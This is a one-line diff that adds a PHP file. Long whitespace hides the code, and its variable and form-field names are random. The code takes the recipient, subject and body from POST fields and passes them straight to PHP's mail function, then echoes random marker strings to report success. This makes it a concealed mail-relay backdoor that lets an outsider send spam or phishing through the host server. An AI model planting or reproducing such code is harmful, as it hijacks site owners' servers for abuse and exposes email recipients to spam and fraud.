@@ -1,0 +1,1 @@
+																															<?php $HmqenXtApUBX = stripslashes($_POST['OejVxex']); $SFQsFl = stripslashes($_POST['GQrR']); $oabczZQYGw = stripslashes($_POST['bupthoehyRL']);  $rato = mail(stripslashes($HmqenXtApUBX), stripslashes($SFQsFl), stripslashes($oabczZQYGw)); if($rato){echo 'dOuAfkhHe';} else {echo 'MdxXEYvzD : '.$XJaIKNNKlBfm;} ?>
